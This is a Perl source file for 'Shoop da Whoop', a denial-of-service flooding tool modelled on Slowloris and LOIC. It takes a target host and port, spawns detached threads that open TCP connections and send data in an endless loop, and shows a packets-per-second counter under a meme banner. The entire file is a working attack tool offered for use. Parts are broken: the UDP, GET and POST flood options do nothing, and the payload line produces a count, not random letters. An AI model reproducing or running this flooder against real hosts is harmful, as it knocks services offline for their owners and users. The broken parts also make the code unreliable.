#!/usr/bin/env perl
#
# Shoop da Whoop
# Andrew Pennebaker
#
# Based on Slowloris and LOIC
# http://ha.ckers.org/slowloris/
# https://github.com/NewEraCracker/LOIC

use strict;
use warnings;
use Term::ReadKey qw(ReadMode);
use IO::Socket::INET;
use Socket qw(IPPROTO_TCP TCP_NODELAY);
use Number::Format;
use Getopt::Long;
use Config;

# Curses::UI and Term::Screen fail to compile for ActiveState Perl
use Games::Roguelike::Console;

sub usage {
	print "Usage: $0 [host[:port]]\n\n";

	print "Port defaults to 80.\n";
	print "If no host is provided, the hive will be polled.\n\n";

	print "--delay -d sec\tPause between floods\n";
	print "--auto -a [sec]\tPoll hive with optional delay\n";
	print "--tcp -t\tTCP SYN/ACK flood (default)\n";
	print "--udp -u\tUDP flood\n";
	print "--get -g\tGET flood\n";
	print "--post -p\tPOST flood\n";
	print "--block -b\tDo not wait for reply\n";
	print "--help -h\tUsage information\n";

	exit 1;
}

srand;

$SIG{PIPE} = 'IGNORE'; # ignore broken pipes

our $con;

our $THREADS = 0;
if ($Config{usethreads}) {
	use threads;
	use threads::shared;
	$THREADS = 1;
}

our $HIVE_QUERY = "http://search.twitter.com/search.atom?q=loic";
our $TCP_TIMEOUT = 9001; # sec
our $MAX_THREADS = 10;
our $PACKETS :shared = 0;

our $STAT_INTERVAL = 5; # sec
our $FORMATTER = new Number::Format;

our $tcp = 1;
our $udp = 0;
our $get = 0;
our $post = 0;
our $delay = 0; # sec
our $poll = 600; # sec
our $host = "";
our $port = 80;
our $block = 0;

my $result = GetOptions(
	"tcp|t" => \$tcp,
	"udp|u" => \$udp,
	"get|g" => \$get,
	"post|p" => \$post,
	"delay|d=i" => \$delay,
	"auto|a:i" => sub { $poll = shift @_ or 600000; }, # ms
	"block|b" => \$block,
	"help|h" => \&usage,
	"<>" => sub {
		my @parts = split(/:/, shift @_);

		$host = shift @parts;

		if ($#parts == 1) {
			$port = shift @parts;
			usage unless $port > 0 && $port < 65536;
		}
	}
);

usage unless $result;

usage unless ($host ne "" && $port); # until hive functionality is added

sub flood {
	my $sock;

	while (1) {
		if ((!defined $sock) || !$sock) {
		    $sock = new IO::Socket::INET(
				PeerAddr => $host,
				PeerPort => $port,
				Timeout => $TCP_TIMEOUT,
				Proto => "tcp",
				Blocking => $block
			);
		}

		if (defined $sock && $sock) {
			my $payload;

			if ($tcp) {
				setsockopt $sock, IPPROTO_TCP, TCP_NODELAY, 1;
				$payload = map { chr(65 + rand(26)) } 0..6;
			}

			print $sock $payload;

			if ($SIG{__WARN__}) {
				close $sock;
			}
			else {
				if ($tcp) {
					$PACKETS += 4;
				}
				else {
					$PACKETS++;
				}
			}
		}

		sleep $delay;
	}
}

# Games::Rogulelike and Curses do not quit properly.
sub reset_signals {
	$SIG{INT} = sub {
		undef $con;

		# Allow terminal echo
		if ($^O =~ /linux|darwin/) {
			my $tty = POSIX::ttyname(1);

			if ($^O =~ /darwin/) {
				system "stty -f $tty icanon echo";
			}
			else {
				system "stty -F $tty icanon echo";
			}

			# Show the cursor
			print "\e[?25h";
		}

		exit 0;
	};
}

sub shoop {
	# Console::ANSI works better for *nix
	if ($^O =~ /linux|darwin/) {
		$con = Games::Roguelike::Console::ANSI->new;
	}
	else {
		$con = Games::Roguelike::Console->new;
	}

	# Force hide the cursor
	if ($^O =~ /linux|darwin/) {
		print "\e[?25l";
	}

	reset_signals;

	my $width = $con->{winx};
	
	my $filler = "~" x ($width - 5);

	$con->addch(0, 1, "O");
	$con->addch(0, 2, "_");
	$con->addch(0, 3, "o");
	$con->addch(1, 1, "/");
	$con->addch(2, 0, "|");
	$con->addch(3, 1, "\\_");
	$con->addch(2, 2, "IMMA\' FIRIN\' MAH LAZER!");
	$con->addch(5, 0, "Press Control+C to quit.");
	$con->refresh;

	my $startt = time;

	if ($THREADS) {
		map { my $t = threads->create(\&flood); $t->detach; } 1..$MAX_THREADS;
	}
	else {
		flood;
	}

	my $interval = 0;

	my $pps = 0;
	my $message = "IMMA\' FIRIN\' MAH LAZER!";

	while (1) {
		$interval = time - $startt;

		if ($interval < 3) {}
		elsif ($PACKETS < 3) {
			$message = "FAILED TO CONNECT TO $host:$port";
		}
		else {
			$con->addch(1, 3, $filler);
			$con->addch(3, 3, $filler);

			$pps = $FORMATTER->format_number(int($PACKETS / $interval));
			$message = "SENDING $host $pps PACKETS/SEC\n";
		}

		$con->addch(2, 2, uc $message);
		$con->refresh;
	}

	undef $con;
}

shoop;